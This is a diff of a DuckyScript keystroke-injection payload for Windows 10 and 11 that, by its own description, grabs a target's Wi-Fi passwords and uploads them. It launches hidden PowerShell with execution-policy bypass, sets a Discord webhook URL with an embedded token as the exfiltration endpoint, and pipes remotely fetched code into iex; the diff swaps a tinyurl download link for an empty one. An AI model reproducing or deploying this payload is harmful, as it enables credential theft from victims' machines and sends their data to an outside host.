@@ -6,10 +6,11 @@ REM     Description: This payload grabs target's wifi passwords and uploads them
 
 REM     Target: Windows 10, 11
 
+
 GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1323334359637299260/Qv7i_KMbMId0j3NstBQfhRXdNHiHaccFUQUHt_qNxFNSZRG8KhNPSlA8DVG0hH9H8MhX
-';$db='';irm https://tinyurl.com/Modulator-01 | iex
+';$db='';irm  | iex
 ENTER
 
 
